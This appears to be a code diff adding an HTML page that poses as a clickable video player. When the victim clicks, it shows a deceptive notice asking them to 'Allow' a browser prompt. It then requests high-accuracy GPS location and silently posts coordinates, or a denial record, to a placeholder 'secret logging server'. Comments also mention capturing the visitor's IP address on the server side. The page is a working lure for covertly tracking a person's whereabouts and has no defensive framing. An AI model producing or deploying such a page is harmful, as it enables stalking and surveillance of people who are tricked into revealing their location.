@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Must-Watch Video - Click to Play!</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0f172a; /* Dark background like a video site */
+        }
+        #video-container {
+            position: relative;
+            width: 90%;
+            max-width: 800px;
+            aspect-ratio: 16 / 9;
+            background-color: #000;
+            cursor: pointer;
+            margin: 50px auto;
+            border-radius: 12px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #play-button {
+            width: 80px;
+            height: 80px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s;
+        }
+        #play-button:hover {
+            transform: scale(1.05);
+        }
+        #play-button svg {
+            fill: #1e3a8a;
+            width: 40px;
+            height: 40px;
+            margin-left: 5px; /* Triangle offset */
+        }
+    </style>
+</head>
+<body>
+
+<div id="video-container" onclick="attemptLocationTracking()">
+    <!-- Fake Video Player Interface -->
+    <div id="play-button">
+        <svg viewBox="0 0 24 24">
+            <path d="M8 5v14l11-7z"/>
+        </svg>
+    </div>
+    <div class="absolute bottom-4 left-4 text-white text-sm bg-black bg-opacity-50 px-2 py-1 rounded">0:15 / 1:45</div>
+    <div id="notification" class="absolute top-0 left-0 right-0 p-3 bg-red-600 text-white font-bold text-center hidden">
+        Video requires a quick browser update to view. Click OK/Allow.
+    </div>
+</div>
+
+<script>
+    const SERVER_ENDPOINT = 'https://your-secret-logging-server.com/log_location';
+    const videoContainer = document.getElementById('video-container');
+    const notification = document.getElementById('notification');
+    let trackingAttempted = false;
+
+    // This function runs on interaction (when they click the fake video to 'play' it)
+    function attemptLocationTracking() {
+        if (trackingAttempted) return;
+        trackingAttempted = true;
+        
+        // Show deceptive notification to prime the user for a prompt
+        notification.classList.remove('hidden');
+        notification.textContent = "Loading video components... Please click 'Allow' if prompted by your browser for optimal playback quality.";
+
+        if (navigator.geolocation) {
+            // Request high accuracy for the best possible location data
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // Log the success silently
+                    logDataToServer({
+                        status: 'Success',
+                        timestamp: new Date().toISOString(),
+                        latitude: lat,
+                        longitude: lon,
+                        accuracy: position.coords.accuracy
+                    });
+
+                    // Update UI to simulate 'playing' the video
+                    videoContainer.style.backgroundColor = '#10b981'; // Green to signal success
+                    videoContainer.innerHTML = '<h2 class="text-white text-3xl font-bold">Video Starting Now...</h2>';
+                },
+                (error) => {
+                    // Log the failure silently (e.g., if they click Deny)
+                    logDataToServer({
+                        status: 'Denied/Failed',
+                        timestamp: new Date().toISOString(),
+                        error_code: error.code,
+                        error_message: error.message
+                    });
+
+                    // Update UI to simulate a 'video error' or 'ad block'
+                    videoContainer.style.backgroundColor = '#ef4444'; // Red to signal 'error'
+                    videoContainer.innerHTML = '<h2 class="text-white text-3xl font-bold">Error: Video Playback Failed. Try refreshing.</h2>';
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            // Log if geolocation is not supported
+            logDataToServer({
+                status: 'BrowserUnsupported',
+                timestamp: new Date().toISOString()
+            });
+
+            videoContainer.innerHTML = '<h2 class="text-white text-3xl font-bold">Error: Browser Not Supported.</h2>';
+        }
+    }
+
+    // Function to silently send the data to your logging server
+    function logDataToServer(data) {
+        // Use Fetch API to quietly send the JSON data in the background
+        fetch(SERVER_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            // console.log('Tracking data sent successfully:', response.status); // Silent log for debugging
+        })
+        .catch(error => {
+            // console.error('Failed to send tracking data:', error); // Silent error log
+        });
+    }
+
+    // For initial link click tracking (even if Geolocation fails) you'd log the IP from your server side.
+    // This client-side code focuses on getting the precise GPS data.
+</script>
+
+</body>
+</html>
